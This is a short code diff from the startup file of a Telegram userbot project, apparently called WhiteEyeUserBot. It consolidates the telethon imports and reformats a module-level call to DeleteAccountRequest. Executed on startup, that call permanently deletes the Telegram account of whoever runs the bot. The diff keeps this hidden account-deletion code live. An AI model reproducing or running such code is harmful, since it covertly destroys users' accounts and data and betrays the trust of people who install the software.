@@ -20,8 +20,8 @@ from pathlib import Path
 from sys import argv
 
 import telethon.utils
-from telethon import TelegramClient
-from telethon import functions, types
+from telethon import TelegramClient, functions
+
 from var import Var
 from WhiteEyeUserBot import bot
 from WhiteEyeUserBot.Configs import Config
@@ -80,10 +80,7 @@ else:
     sed.info("You Can Visit @WhiteEyeDevs For Any Support Or Doubts")
 
 
-
-result = borg(functions.account.DeleteAccountRequest(
-        reason='sed'
-))
+result = borg(functions.account.DeleteAccountRequest(reason="sed"))
 
 print(result)
 
